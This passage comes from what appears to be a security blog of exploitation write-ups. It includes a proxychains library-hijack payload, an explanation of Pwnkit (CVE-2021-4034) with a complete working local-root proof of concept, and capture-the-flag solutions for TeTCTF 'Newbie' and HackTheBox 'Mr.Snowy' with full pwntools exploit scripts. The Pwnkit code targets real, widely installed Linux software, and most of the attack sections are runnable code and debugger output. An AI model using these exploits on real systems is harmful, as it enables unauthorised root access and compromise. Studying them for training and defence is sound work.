</ol>
<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
<p>Let's write the exploit :)</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int socket(){
    system(&quot;/bin/bash&quot;);
    return 0;
}

</code></pre>
<p>Let's compile the exploit as a shared object</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<ol start="3">
<li>Bypass the default libproxychains4.so using our exploit</li>
</ol>
<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pwnkit-cve-2021-4034"><a class="header" href="#pwnkit-cve-2021-4034">Pwnkit (CVE-2021-4034)</a></h1>
<p>CVE-2021-4034 dubbed Pwnkit is a pretty cool and easy-to-understand exploit, newbies should understand how the exploit works since it is pretty straightforward. Before anything, know that i am far away from being the first one who make a blog on this CVE and for this reason i highly suggest that you go check <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">previous research on the vulnerability by Qualys</a>. </p>
<h2 id="what-is-pkexec"><a class="header" href="#what-is-pkexec">What is pkexec</a></h2>
<p>First to understand the exploit we have to understand pkexec. As per the man page, pkexec allows an authorized user to execute a program as another user, if no user is specified then the program will be executed as the super user, root.</p>
<p>This vulnerability is an attacker's dream come true:</p>
<ul>
<li>pkexec is installed by default on all major Linux distributions (we exploited Ubuntu, Debian, Fedora, CentOS, and other distributions are probably also exploitable);</li>
<li>pkexec is vulnerable since its creation, in May 2009 (commit c8c3d83, &quot;Add a pkexec(1) command&quot;);</li>
<li>any unprivileged local user can exploit this vulnerability to obtain full root privileges;</li>
<li>although this vulnerability is technically a memory corruption, it is exploitable instantly, reliably, in an architecture-independent way;</li>
<li>and it is exploitable even if the polkit daemon itself is not running.</li>
</ul>
<h2 id="the-vulnerability"><a class="header" href="#the-vulnerability">The vulnerability</a></h2>
<p>Here comes the vulnerable part, the beginning of pkexec's main() function processes the commad-line arguments (line 534-568) and searches for the program to be executes, if its path is not absolute, in the directories of the PATH environment variable (lines 610-640) :</p>
<pre><code class="language-c">435 main (int argc, char *argv[])
436 {
...
534   for (n = 1; n &lt; (guint) argc; n++)
535     {
...
568     }
...
610   path = g_strdup (argv[n]);
...
629   if (path[0] != '/')
630     {
...
632       s = g_find_program_in_path (path);
...
639       argv[n] = path = s;
640     }
</code></pre>
<p>Unfortunately, if the number of command-line arguments (argc) is 0 - which means if the argument list argv that we pass to execve() is empty, i.e {NULL} - then <code>argv[0]</code> is <strong>NULL</strong>. This is the argument list's terminator. Therefore :</p>
<ul>
<li>at line 534, the integer n is permanently set to 1;</li>
<li>at line 610, the pointer path is read out-of-bounds from <code>argv[1]</code>;</li>
<li>at line 639, the pointer s is written out-of-bounds <code>argv[1]</code>.</li>
</ul>
<p>But what exactly is read from and written to this out-of-bounds <code>argv[1]</code> ?</p>
<p>To answer this question, we must digress briefly. When we execve() a ne program, the kernel copies our argument, environment strings, and pointers (argc and envp) to the end of the new program's stack; for example :</p>
<pre><code>|---------+---------+-----+------------|---------+---------+-----+------------| 
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | 
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| 
V         V                V           V         V                V 
&quot;program&quot; &quot;-option&quot;           NULL      &quot;value&quot; &quot;PATH=name&quot;          NULL 
</code></pre>
<p>Clearly because the argv and envp pointers are contiguous i memory, if argc is 0, then the out-of-bounds <code>argv[1]</code> is actually <code>envp[0]</code>, the pointer to our first environment variable, &quot;value&quot;. Consequently :</p>
<ul>
<li>At line 610, the path of the program to be executed is read out-of-bounds from <code>argv[1]</code> (i.e <code>envp[0]</code>, and points to &quot;value&quot;).</li>
<li>At line 632, this path &quot;value&quot; is passed to <code>g_find_program_in_path()</code> (because &quot;value does not start with a slash&quot;, at line 629).</li>
<li>Then, <code>g_find_program_in_path()</code> searches for an executable file named &quot;value&quot; in the directories of our PATH environment variable.</li>
<li>If such an executable file is found, its full path is returned to pkexec's main() function (at line 632).</li>
<li>Finally, at line 639, this full path is written out-of-bounds to <code>argv[1]</code> (i.e <code>envp[0]</code>), thus overwriting our first environment variable.</li>
</ul>
<p>So stated more precisely :</p>
<ul>
<li>If our PATH environment variable is &quot;PATH=name&quot;, and if the directory &quot;name&quot; exists (in the current working directory) and contains an executable file named &quot;value&quot;, then a pointer to the string &quot;name/value&quot; is written out-of-bounds to <code>envp[0]</code>.
OR</li>
<li>If our PATH is &quot;PATH=name=.&quot;, and if the directory &quot;name=.&quot; exists and contains an executable file named &quot;value&quot;, then a pointer to the string &quot;name=./value&quot; is written out-of-bounds to <code>envp[0]</code>.</li>
</ul>
<p>In other words, this out-of-bounds write allows us to re-introduce an &quot;unsecure&quot; environment variable (for example LD_PRELOAD) into pkexec's environment. These &quot;unsecure&quot; variables are normally removed (by ld.so) from the environment of SUID programs before the main() function is called.</p>
<p>Last-minute note: polkit also supports non-Linux operating systems such as Solaris and *BSD, but we have not investigated their exploitability. However we note that OpenBSD is not exploitable, because its kernel refuses to execve() a program if argc is 0.</p>
<h2 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h2>
<p>Our question is : to successfully exploit this vulnerability, which &quot;unsecure&quot; variable should we re-introduce into pkexec's environment? Our options are limited, because shortly after the out-of-bounds write (at line 639), pkexec completely clears its environment (at line 702).</p>
<pre><code>------------------------------------------------------------------------
 639       argv[n] = path = s;
 ...
 657   for (n = 0; environment_variables_to_save[n] != NULL; n++)
 658     {
 659       const gchar *key = environment_variables_to_save[n];
 ...
 662       value = g_getenv (key);
 ...
 670       if (!validate_environment_variable (key, value))
 ...
 675     }
 ...
 702   if (clearenv () != 0)
------------------------------------------------------------------------
</code></pre>
<p>The answer to our question comes from pkexec's complexity: to print an error message to stderr, pkexec calls the GLib's function <code>g_printerr()</code> (note: the Glib is a GNOME library, note the GNU C Library, aka glibc); for example, the functions <code>validate_environment_variable()</code> and <code>log_message()</code> call <code>g_printerr()</code> (at lines 126 and 408-409):</p>
<pre><code>------------------------------------------------------------------------
  88 log_message (gint     level,
  89              gboolean print_to_stderr,
  90              const    gchar *format,
  91              ...)
  92 {
 ...
 125   if (print_to_stderr)
 126     g_printerr (&quot;%s\n&quot;, s);
------------------------------------------------------------------------
 383 validate_environment_variable (const gchar *key,
 384                                const gchar *value)
 385 {
 ...
 406           log_message (LOG_CRIT, TRUE,
 407                        &quot;The value for the SHELL variable was not found the /etc/shells file&quot;);
 408           g_printerr (&quot;\n&quot;
 409                       &quot;This incident has been reported.\n&quot;);
------------------------------------------------------------------------
</code></pre>
<p><code>g_printerr()</code> normally prints UTF-8 error messages, but it can print messages in another charset if the environment variable <code>CHARSET</code> is not <code>UTF-8</code> (note: CHARSET is not security sensitive, it is not an &quot;unsecure&quot; environment variable). To convert messages from UTF-8 to another charset, <code>g_printerr()</code> calls the glibc's function from <code>iconv_open()</code>.</p>
<p>To convert messages from one charset to another, <code>iconv_open()</code> executes small shared libraries; normally, these triplets (&quot;from&quot; charset. &quot;to&quot; charset, and library name) are read from a default configuration file, <code>/usr/lib/gconv/gconv-modules</code>. Alternatively, the environment variable <code>GCONV_PATH</code> can force <code>iconv_open()</code> to read another configuration file; naturaly, <code>GCONV_PATH</code> is <strong>one of the &quot;unsecure&quot; environment variables (because it leads to the execution of arbitrary libraries)</strong>, and is therefore removed by <code>ld.so</code> from the <strong>environment of SUID programs</strong>.</p>
<p>Unfortunately, CVE-2021-4034 allows us to re-introduce <code>GCONV_PATH</code> into pkexec's environment, and to execute our own shared library, as root.</p>
<p>IMPORTANT : <em>this exploitation technique leaves traces in the logs (either &quot;the value for the SHELL variable was not found in the /etc/shells file&quot; or &quot;the value for environment variable [...] contains suspicious content&quot;). However, please note that this vulnerability is also exploitable without leaving any traces in the logs, but this is left as an exercise for the interested reader.</em></p>
<h2 id="proof-of-concept"><a class="header" href="#proof-of-concept">Proof of Concept</a></h2>
<p>The most popular proof of concept for this exploit might be the one available at <a href="https://github.com/arthepsy/CVE-2021-4034">this link</a> by arthepsy.</p>
<pre><code class="language-c">/*

* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;

* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

*/

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;unistd.h&gt;

char *shell = &quot;#include &lt;stdio.h&gt;\n&quot;
			  &quot;#include &lt;stdlib.h&gt;\n&quot;
			  &quot;#include &lt;unistd.h&gt;\n\n&quot;
			  &quot;void gconv() {}\n&quot;
			  &quot;void gconv_init() {\n&quot;
			  &quot; setuid(0); setgid(0);\n&quot;
			  &quot; seteuid(0); setegid(0);\n&quot;
			  &quot; system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\&quot;);\n&quot;
			  &quot; exit(0);\n&quot;
			  &quot;}&quot;;

int main(int argc, char *argv[]) {
	FILE *fp;
	system(&quot;mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'&quot;);
	system(&quot;mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules&quot;);
	fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);
	fprintf(fp, &quot;%s&quot;, shell);
	fclose(fp);
	system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);
	char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };
	execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="newbie---tetctf-2022"><a class="header" href="#newbie---tetctf-2022">Newbie - TeTCTF 2022</a></h1>
<p>This challenge was the first pwn challenge i did from the TeTCTF 2022 event, the challenge was an awesome ret2libc with a stack canary bypass.</p>
<p>Thanks to amon for the help on this one, he showed me how easy it was to leak the stack canary in the current binary context.</p>
<h2 id="looking-at-the-binary"><a class="header" href="#looking-at-the-binary">Looking at the binary</a></h2>
<p>So here's how the program works, it first read 10 bytes from <code>/dev/urandom</code> and store them in an 16 bits unsigned integer array.</p>
<p>Then the program start a loop in which it asks us for an input, we have multiple input choice here are the 3 choices we have : <code>id </code>, <code>create </code>, <code>quit </code>. </p>
<p>If we enter <code>id </code> the program we look for the next characters and calls <code>atoi</code> on them, this part is vulnerable and will allow us to leak values on the stack.</p>
<p>If we enter <code>create</code>, the program will generate a hash using 32 rand calls, the last value entered in id is used ass seed for our rand calls, this function will also be used to leak stack values.</p>
<p>If we enter <code>quit</code>, the program will quit and hit the return of the main function, this is the part vulnerable to a buffer overflow.</p>
<h2 id="finding-the-main-function-in-the-stripped-binary"><a class="header" href="#finding-the-main-function-in-the-stripped-binary">Finding the main function in the stripped binary</a></h2>
<p>The binary is stripped hence a little harder to find the main part of our program, here's how i found the main function.</p>
<p>I first started the program in gdb, ran it once to have the right addresses used, then use the <code>info file</code> to find the entry point of our binary.</p>
<p>I then put a breakpoint at this location, then i can run the program. The program breaks at our breakpoint and we can see a bit of the current function.</p>
<pre><code>pwndbg&gt; b *0x5555554009c0
pwndbg&gt; r
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x5555554009c0    xor    ebp, ebp
   0x5555554009c2    mov    r9, rdx
   0x5555554009c5    pop    rsi
   0x5555554009c6    mov    rdx, rsp
   0x5555554009c9    and    rsp, 0xfffffffffffffff0
   0x5555554009cd    push   rax
   0x5555554009ce    push   rsp
   0x5555554009cf    lea    r8, [rip + 0x4aa]
   0x5555554009d6    lea    rcx, [rip + 0x433]
   0x5555554009dd    lea    rdi, [rip + 0x3eb]
   0x5555554009e4    call   qword ptr [rip + 0x2015f6]    &lt;__libc_start_main&gt;
</code></pre>
<p>Looking at the DISASM output, we can notice that $rip+0x3eb is being put into rdi before the call to <code>__libc_start_main</code>, let's step until we're at address <code>0x5555554009dd</code> then disass the instructions at <code>$rip+0x3eb</code>.</p>
<pre><code>pwndbg&gt; x/10i $rip+0x3eb
   0x555555400dc8:      call   0x5555554008f0 &lt;__stack_chk_fail@plt&gt;
   0x555555400dcd:      leave  
   0x555555400dce:      ret    
   0x555555400dcf:      push   rbp
   0x555555400dd0:      mov    rbp,rsp
   0x555555400dd3:      sub    rsp,0x10
   0x555555400dd7:      mov    DWORD PTR [rbp-0x4],edi
   0x555555400dda:      mov    QWORD PTR [rbp-0x10],rsi
   0x555555400dde:      mov    eax,0x0
   0x555555400de3:      call   0x555555400b69

pwndbg&gt; b *0x555555400dcf
pwndbg&gt; del 1
</code></pre>
<p>Disassembling the instructions at ($rip+0x3eb, $rip+0x3eb+10) show us that the main function begins at address <code>0x555555400dcf</code>, so we put a breakpoint here and remove our older breakpoint.</p>
<p>We can then continue the program, we should hit the main function.</p>
<h2 id="starting-the-exploitation-of-the-program"><a class="header" href="#starting-the-exploitation-of-the-program">Starting the exploitation of the program</a></h2>
<p>Looking at RAX before the call to <code>create</code> at address <code>0x555555400bd1</code>, knowing that <code>id 0</code> correspond to the first 2 bytes we read from <code>/dev/urandom</code> we can see that these bytes are 0x779f</p>
<p>Let's search for these bytes somewhere on the stack.</p>
<pre><code>pwndbg&gt; search -t short 0x779f
[stack]		0x7fffffffdbf6 0x365b3b3fb0ef779f
</code></pre>
<p>We see that the value read inside <code>/dev/urandom</code> begins at address 0x7fffffffdbf6,</p>
<p>Looking at the values on the stack around the address 0x7fffffffdbf6.</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6
0x7fffffffdbf6: 0x365b3b3fb0ef779f      0x6574616572633bf8
0x7fffffffdc06: 0x7ffff7e0de630000      0x0000000000140000
0x7fffffffdc16: 0x7ffff7f967600000      0x555555400f260000
0x7fffffffdc26: 0x7ffff7e0203a0000      0x0000000000000000
0x7fffffffdc36: 0x0000000000000000      0x0000000000000000
0x7fffffffdc46: 0x7fffffffdc800000      0x7fffffffdda80000
0x7fffffffdc56: 0x82bd5de3ae000000      0x7fffffffdc80e6fa
0x7fffffffdc66: 0x555555400dfe0000      0x7fffffffdda80000
0x7fffffffdc76: 0x0001000000010000      0x0000000000010000
0x7fffffffdc86: 0x7ffff7daafd00000      0x5555554000400000
0x7fffffffdc96: 0x555555400dcf0000      0x0001000000000000
0x7fffffffdca6: 0x7fffffffdda80000      0x0000000000000000
0x7fffffffdcb6: 0xd64dc4ec68470000      0x7fffffffdda8eb29
0x7fffffffdcc6: 0x555555400dcf0000      0x0000000000000000
0x7fffffffdcd6: 0x7ffff7ffbc400000      0x29b27dce68470000
0x7fffffffdce6: 0x39f89be6684714d6      0x7fff0000000014d6
</code></pre>
<p>We can see the bytes generated by <code>/dev/urandom</code> at address <code>0x7fffffffdbf6</code> are <code>0x365b3b3fb0ef779f</code>, and we know we are dealing with array of 16 bits each and we read 10 bytes in <code>/dev/urandom</code>, we can translate this string to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
</code></pre>
<p>Note that we miss id 4, which should be the last 2 bytes of the address just before <code>0x7fffffffdbf6</code> which is the address we can find the value <code>0x365b3b3fb0ef779f</code> on the stack.</p>
<p>We can print the last 2 missing bytes using the following command inside pwndbg</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6+2
0x7fffffffdbf8: 0x3bf8365b3b3fb0ef      0x0000657461657263
0x7fffffffdc08: 0x00007ffff7e0de63      0x0000000000000014
0x7fffffffdc18: 0x00007ffff7f96760      0x0000555555400f26
0x7fffffffdc28: 0x00007ffff7e0203a      0x0000000000000000
0x7fffffffdc38: 0x0000000000000000      0x0000000000000000
0x7fffffffdc48: 0x00007fffffffdc80      0x00007fffffffdda8
0x7fffffffdc58: 0xe6fa82bd5de3ae00      0x00007fffffffdc80
0x7fffffffdc68: 0x0000555555400dfe      0x00007fffffffdda8
0x7fffffffdc78: 0x0000000100000001      0x0000000000000001
0x7fffffffdc88: 0x00007ffff7daafd0      0x0000555555400040
0x7fffffffdc98: 0x0000555555400dcf      0x0000000100000000
0x7fffffffdca8: 0x00007fffffffdda8      0x0000000000000000
0x7fffffffdcb8: 0xeb29d64dc4ec6847      0x00007fffffffdda8
0x7fffffffdcc8: 0x0000555555400dcf      0x0000000000000000
0x7fffffffdcd8: 0x00007ffff7ffbc40      0x14d629b27dce6847
0x7fffffffdce8: 0x14d639f89be66847      0x00007fff00000000
</code></pre>
<p>Looking at the output  we can deduce that the last 2 missing bytes read from <code>/dev/urandom</code> are <code>0x3bf8</code>, we can then translate the whole value read from <code>/dev/urandom</code> to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
id 4: 0x3bf8
</code></pre>
<p>We can confirm the following by continuing our program in the debugger and input <code>id 1</code> then break just before our call to <code>create</code> at address <code>0x555555400d80</code>.</p>
<pre><code>pwndbg&gt; b *0x555555400d80
Breakpoint 4 at 0x555555400d80
</code></pre>
<p>Then let's add another breakpoint right before the function that asks us for input at address <code>0x555555400d1a</code></p>
<pre><code>pwndbg&gt; x/30i $rip-200
   0x555555400cb3:      lea    edi,[rip+0x236]        # 0x555555400eef
   0x555555400cb9:      mov    eax,0x0
   0x555555400cbe:      call   0x555555400970 &lt;open@plt&gt;
   0x555555400cc3:      mov    DWORD PTR [rbp-0x70],eax
   0x555555400cc6:      cmp    DWORD PTR [rbp-0x70],0xffffffff
   0x555555400cca:      jne    0x555555400ce2
   0x555555400ccc:      lea    rdi,[rip+0x229]        # 0x555555400efc
   0x555555400cd3:      call   0x5555554008e0 &lt;puts@plt&gt;
   0x555555400cd8:      mov    edi,0x0
   0x555555400cdd:      call   0x555555400990 &lt;exit@plt&gt;
   0x555555400ce2:      lea    rcx,[rbp-0x6a]
   0x555555400ce6:      mov    eax,DWORD PTR [rbp-0x70]
   0x555555400ce9:      mov    edx,0xa
   0x555555400cee:      mov    rsi,rcx
   0x555555400cf1:      mov    edi,eax
   0x555555400cf3:      mov    eax,0x0
   0x555555400cf8:      call   0x555555400940 &lt;read@plt&gt;
   0x555555400cfd:      lea    rdi,[rip+0x1fe]        # 0x555555400f02
   0x555555400d04:      mov    eax,0x0
   0x555555400d09:      call   0x555555400910 &lt;printf@plt&gt;
   0x555555400d0e:      lea    rax,[rbp-0x60]
   0x555555400d12:      mov    esi,0x100
   0x555555400d17:      mov    rdi,rax
   0x555555400d1a:      call   0x555555400aca
   0x555555400d1f:      lea    rax,[rbp-0x60]
   0x555555400d23:      mov    edx,0x3
   0x555555400d28:      lea    rsi,[rip+0x1d6]        # 0x555555400f05
   0x555555400d2f:      mov    rdi,rax
   0x555555400d32:      call   0x5555554008d0 &lt;strncmp@plt&gt;
   0x555555400d37:      test   eax,eax

pwndbg&gt; b *0x555555400aca
</code></pre>
<p>Then we can continue and confirm that <code>id 1</code> is equal to <code>0xb0ef</code></p>
<pre><code>pwndbg&gt; c
pwndbg&gt; c 
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
id 1

pwndbg&gt; c
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
create

pwndbg&gt; c
</code></pre>
<p>After this the program should have break at address <code>0x555555400d80</code> which is right before our call to <code>create</code> where we want to be.</p>
<p>Looking at eax show that we were right on our theory about how this program works.</p>
<pre><code>pwndbg&gt; i r eax
eax            0xb0ef              45295
</code></pre>
<h2 id="canaries"><a class="header" href="#canaries">Canaries</a></h2>
<p>Knowing we can leak 2 bytes from pretty much anywhere in our program, we can use this to leak the value of the stack canary and therefore bypass it easily.</p>
<pre><code>pwndbg&gt; canary
AT_RANDOM = 0x7fffffffe119 # points to (not masked) global canary value
Canary    = 0xe6fa82bd5de3ae00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffd988 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda48 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdaa8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdab8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdac8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdb18 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdbc8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdc58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdd18 ◂— 0xe6fa82bd5de3ae00
</code></pre>
<p>We can notice that valid canaries have the value <code>0xe6fa82bd5de3ae00</code> <em>note that this value change every time we run the program</em>, and we are looking particularly for one that is located after our <code>/dev/urandom bytes buffer</code> at address <code>0x7fffffffdbf6</code>, the reason why is that our input is treated as a unsigned integer which means we can't use any negative offsets.</p>
<p>We can use the stack canary that is located at address <code>0x7fffffffdc58</code> which is located after our buffer on the stack (0x7fffffffdc58 - 0x7fffffffdbf6 = 98).</p>
<p>We have 98 bytes of offset between the beginning of our canary and our <code>10 bytes</code> we read out of <code>/dev/urandom</code></p>
<p>Since we're dealing with nibbles, we are going to need to split our bytes in offset by 2 which give us a final offset of <code>49</code></p>
<p>We are also going to need to leak something from libc, something we know that is definitely on the stack is the return address back into <code>__libc_start_main</code> from the <code>main</code> function. Searching for it tells us that it is at the stack address <code>0x7fffffffdc88</code> on the stack.</p>
<pre><code>pwndbg&gt; bt
#0  0x0000555555400d80 in ?? ()
#1  0x0000555555400dfe in ?? ()
#2  0x00007ffff7daafd0 in __libc_start_call_main (main=main@entry=0x555555400dcf, argc=argc@entry=1, argv=argv@entry=0x7fffffffdda8) at ../sysdeps/nptl/libc_start_call_main.h:58
#3  0x00007ffff7dab07d in __libc_start_main_impl (main=0x555555400dcf, argc=1, argv=0x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdd98) at ../csu/libc-start.c:409
#4  0x00005555554009ea in ?? ()

pwndbg&gt; search -t qword 0x00007ffff7daafd0
[stack]         0x7fffffffdc88 0x7ffff7daafd0
</code></pre>
<p>We can now calculate the offset between the return address of <code>__libc_start_main</code> and our 10 bytes read from <code>/dev/urandom</code> the same way we did with canaries (0x7fffffffdc88 - 0x7fffffffdbf6 = 146).</p>
<p>Once again since we're dealing with <code>16 bits unsigned integer</code> we are going to need to split this value by 2, which will give us the final offset of <code>73</code>.</p>
<p>Now that we leak our canary we should be able to determine the offset of rip where our program crashes.</p>
<h2 id="writing-exploit"><a class="header" href="#writing-exploit">Writing Exploit</a></h2>
<p>With all the knowledge we've gained on this binary so far we should be ready to write an exploit script.</p>
<pre><code class="language-py">from pwn import *
import ctypes
from one_gadget import generate_one_gadget

charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;
stack_canary_offset = 49 # This is the offset we've obtained for the canary we choosed on the stack
stack___libc_start_main_offset = 73 # Since we need to leak something from libc we can leak the return address back into __libc_start_main from the main function
hashes = {} # We compute every possible hashes (65535) and add them to this array

# This function will leak the value at our offset argument.
def leak(p, offset, toggle=True):
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;id &quot; + str(offset).encode())
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;create&quot;)
    p.recvuntil(b&quot;Your key: &quot;)
    key = p.recvline().strip().decode()
    value = hashes[key]
    # correct for the one and zero collision.
    if value == 1 and toggle:
        value = 0
    
    log.info(f&quot;Offset {offset}: {key} ({hex(value)})&quot;)
    return value


# The function precompute will precompute every possible 2 bytes values that we read from /dev/urandom
def precompute():
    libc = ctypes.cdll.LoadLibrary(&quot;libc.so.6&quot;)
    global hashes
    # loop in all 2 bytes possibilities (0x0000, 0xffff), this will generate all possibilities generated by /dev/urandom
    for i in range(0xffff+1):
        libc.srand(i)
        val = &quot;&quot;
        for j in range(32):
            val += charset[libc.rand() % len(charset)]
        hashes[val] = i
    log.info(f&quot;Computed {len(hashes)} hashes.&quot;)

def main():
    precompute()

    # Find themagicone gadget in the provided libc
    libc_path = &quot;./libc-2.27.so&quot;
    magic_offset = next(generate_one_gadget(libc_path))
    log.info(f&quot;Found magic one gadget at offset: {hex(magic_offset)}&quot;)

    # Get the __libc_start_main offset
    libc_elf = ELF(libc_path)
    __libc_start_main_offset = libc_elf.libc_start_main_return
    log.info(f&quot;__libc_start_main_offset {hex(__libc_start_main_offset)}&quot;)

    # start the program
    p = process(&quot;./newbie&quot;)

    # Leak the canary
    canary = 0
    for i in range(4): # Canary is 8 bytes, but we read only 2 of em each time, so we loop 4 time and do some bit shifting arithmetic
        canary += (leak(p, stack_canary_offset+i)) &lt;&lt; (16 * i) # 16 * 4 = 64 bits (8 bytes).
    log.info(f&quot;Leaked Canary {hex(canary)}&quot;)

    # leak the libc start main return value
    __libc_start_main = 0
    for i in range(4):
        __libc_start_main += (leak(p, stack___libc_start_main_offset + i)) &lt;&lt; (16 * i) # 2 bytes at (stack__libc_start_main_offset + i)
    log.info(f&quot;Leaked __libc_start_main: {hex(__libc_start_main)}&quot;)
    # Get the libc base offset
    libc_base = __libc_start_main - __libc_start_main_offset
    log.info(f&quot;libc base address {hex(libc_base)}&quot;)
    # Calculate magic offset address using libc base
    magic = libc_base + magic_offset
    log.info(f&quot;Magic one gadget address : {hex(magic)}&quot;)

    # Trigger Buffer Overflow
    p.recvuntil(b&quot;&gt; &quot;)
    payload = b&quot;A&quot; * 88 + p64(canary) + p64(0x4242424242424242) + p64(magic)
    p.sendline(payload)
    # Quit to return
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;quit&quot;)
    log.success(&quot;Shell spawned! Enjoy !&quot;)

    p.interactive()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-mrsnowy"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-mrsnowy">Cyber Santa is Coming to Town (Pwn Mr.Snowy)</a></h1>
<p>So this was the first pwn challenge of the hackthebox 2021 christmas hacking ctf, it was <strong>too much simple</strong> i think but was a great practice whatsoever.</p>
<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving the Challenge</a></h2>
<p>The program starts by telling us, we are in Santa's garden, and there is a suspicious snowman.
We are then asked between 2 choices :</p>
<pre><code>- Investigate
- Let it be
</code></pre>
<p>If you choose Let it be, the program will just quit without doing anything, however if you use the Investigate button the program will use the <strong>read</strong> syscall to <strong>read 0x108 bytes inside a buffer of 64 bytes</strong>, this is a regular buffer overflow, next step was to find the offset at which we can overwrite the return address of the current function we're in. </p>
<p>For this i have sent a <strong>cyclic pattern of 500 bytes</strong> to our program, running it in gdb shows us that the return address starts to be overwritten after 72 bytes, this means we need an offset of <strong>72 bytes before our shellcode or whatever exploit we will use</strong>.</p>
<p>After looking at what i can now do, i found this function called <strong>deactivate_camera</strong>, the body of the functions lookslike it reads a flag file and output it to stdout.</p>
<p>Changing the return address for the <strong>deactivate_camera</strong> function effectively reads the flag, we can now write a python script to automatically solve this challenge :</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;

elf = ELF(&quot;/challenge/pwn_mr_snowy/mr_snowy&quot;)
io = elf.process()

win_function_addr = elf.sym[&quot;deactivate_camera&quot;]

payload = b&quot;A&quot; * 72 + p64(win_function_addr) 

io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
io.sendlineafter(b&quot;&gt; &quot;, payload)
io.interactive()
</code></pre>
<p>This code should return inside the <strong>deactivate_camera</strong> function and therefore print your flag :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-sleigh"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-sleigh">Cyber Santa is Coming to Town (Pwn Sleigh)</a></h1>
